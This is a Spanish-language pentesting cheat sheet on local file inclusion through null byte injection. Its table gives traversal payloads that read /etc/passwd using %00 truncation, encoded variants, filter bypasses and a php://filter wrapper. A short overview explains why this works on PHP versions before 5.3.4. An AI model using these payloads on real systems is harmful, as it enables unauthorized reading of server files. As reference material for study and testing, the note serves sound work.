---
aliases:
tags:
  - type/technique
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[File Inclusion]]"
---
# LFI - Null Byte Injection 

***

## Cheatsheet

|                **Técnica**                |                            **Descripción**                             |                      **Payload**                      |
| :---------------------------------------: | :--------------------------------------------------------------------: | :---------------------------------------------------: |
|         <br>**Null byte básico**          |         <br>Truncar la extensión concatenada con `%00`<br><br>         |            <br>`../../../../etc/passwd%00`            |
|  <br>**Null byte con extensión forzada**  | <br>Cortar `.php` o cualquier extensión que el servidor agrega<br><br> |          <br>`../../../../etc/passwd%00.php`          |
|       <br>**Null byte URL encoded**       |              <br>Variante encodeada del null byte<br><br>              |           <br>`../../../../etc/passwd%2500`           |
|   <br>**Null byte con double encoding**   |   <br>Doble encode para evadir filtros que decodean una vez<br><br>    |         <br>`../../../../etc/passwd%25%30%30`         |
| <br>**Null byte + path traversal bypass** |    <br>Combinar null byte con técnicas de bypass de filtros<br><br>    |            <br>`....//....//etc/passwd%00`            |
|    <br>**Null byte en parámetro POST**    |     <br>Inyectar el null byte en datos POST en vez de GET<br><br>      |  <br>`file=../../../../etc/passwd%00` (via POST)<br>  |
|       <br>**Null byte con wrapper**       |      <br>Combinar con wrappers de PHP para mayor alcance<br><br>       | <br>`php://filter/resource=../../../../etc/passwd%00` |
^lfi-nullbyte

***

## Overview

El null byte (`\0` o `%00`) es un terminador de string en C. En versiones de PHP anteriores a 5.3.4, las funciones de inclusión (`include`, `require`) pasaban el string a funciones de C que interpretaban el null byte como fin del string, descartando todo lo que viniera después. Esto permitía eliminar extensiones que el código concatenaba automáticamente (por ejemplo `.php`). Es una técnica legacy, prácticamente extinta en entornos modernos, pero sigue apareciendo en CTFs y en sistemas desactualizados.


***
